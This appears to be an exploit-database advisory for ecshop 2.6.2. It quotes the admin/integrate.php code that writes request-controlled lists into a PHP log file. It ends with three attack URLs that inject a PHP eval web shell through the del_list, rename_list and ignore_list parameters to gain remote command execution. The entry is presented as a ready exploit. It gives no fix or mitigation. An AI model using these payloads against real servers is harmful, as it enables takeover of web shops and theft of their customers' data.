ecshop 2.6.2 Multiple Remote Command Execution Vulnerabilities
==============================================================


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1


#################################################################
# Application Info:
# Name: ecshop
# Version: 2.6.2
# Website: http://www.ecshop.com
#################################################################
#===========================================================
# :: integrate.php ::
#
# if ($_REQUEST[&#039;act&#039;] == &#039;sync&#039;)
# {
# $size = 100;
# ......
# $tasks = array();
# if ($task_del > 0)
# {
# $tasks[] = array(&#039;task_name&#039;=>sprintf($_LANG[&#039;task_del&#039;], $task_del),&#039;task_status&#039;=>&#039;<span id="task_del">&#039; . $_LANG[&#039;task_uncomplete&#039;] . &#039;<span>&#039;);
# $sql = "SELECT user_name FROM " . $ecs->table(&#039;users&#039;) . " WHERE flag = 2";
# $del_list = $db->getCol($sql);//$del_list
# }
# if ($task_rename > 0)
# {
# $tasks[] = array(&#039;task_name&#039;=>sprintf($_LANG[&#039;task_rename&#039;], $task_rename),&#039;task_status&#039;=>&#039;<span id="task_rename">&#039; . $_LANG[&#039;task_uncomplete&#039;] . &#039;</span>&#039;);
# $sql = "SELECT user_name, alias FROM " . $ecs->table(&#039;users&#039;) . " WHERE flag = 3";
# $rename_list = $db->getAll($sql);//$rename_list
# }
# if ($task_ignore >0)
# {
# $sql = "SELECT user_name FROM " . $ecs->table(&#039;users&#039;) . " WHERE flag = 4";
# $ignore_list = $db->getCol($sql);//$ignore_list
# }
# ....
# $fp = @fopen(ROOT_PATH . DATA_DIR . &#039;/integrate_&#039; . $_SESSION[&#039;code&#039;] . &#039;_log.php&#039;, &#039;wb&#039;);
# $log = &#039;&#039;;
# if (isset($del_list))
# {
# $log .= &#039;$del_list=&#039; . var_export($del_list,true) . &#039;;&#039;;
# }
# if (isset($rename_list))
# {
# $log .= &#039;$rename_list=&#039; . var_export($rename_list, true) . &#039;;&#039;;
# }
# if (isset($ignore_list))
# {
# $log .= &#039;$ignore_list=&#039; . var_export($ignore_list, true) . &#039;;&#039;;
# }
# fwrite($fp, $log);
# fclose($fp);
# $smarty->assign(&#039;tasks&#039;, $tasks);
# $smarty->assign(&#039;ur_here&#039;,$_LANG[&#039;user_sync&#039;]);
# $smarty->assign(&#039;size&#039;, $size);
# $smarty->display(&#039;integrates_sync.htm&#039;);
# }
#
#
# http://site.com/admin/integrate.php?act=sync&del_list=<?php%20eval($_POST[cmd])?>
# http://site.com/admin/integrate.php?act=sync&rename_list=<?php%20eval($_POST[cmd])?>
# http://site.com/admin/integrate.php?act=sync&ignore_list=<?php%20eval($_POST[cmd])?>
#===========================================================
#################################################################



